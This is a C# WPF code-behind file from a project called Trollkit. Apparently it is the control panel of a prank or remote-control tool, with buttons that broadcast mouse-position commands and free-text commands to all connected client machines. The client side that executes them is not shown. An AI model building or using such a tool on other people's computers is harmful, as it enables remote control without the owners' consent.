using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;

namespace Trollkit
{
    /// <summary>
    /// Interaction logic for WindowsTrolls2.xaml
    /// </summary>
    public partial class WindowsTrolls2 : UserControl
    {
        private MainWindow ParentFrame { get { return (MainWindow)Application.Current.MainWindow; } }
        private const string Handler = "Windows";
        public WindowsTrolls2()
        {
            InitializeComponent();
        }

        private void BtnStart_Click(object sender, RoutedEventArgs e)
        {
            string X = TbXcoordinate.Text;
            string Y = TbYcoordinate.Text;
            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = Handler, Value = $"{X},{Y}"};
            ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
        }

        private void BtnGo_Click(object sender, RoutedEventArgs e)
        {
            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = Handler, Value = TbComammand.Text};
            ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
        }
    }
}
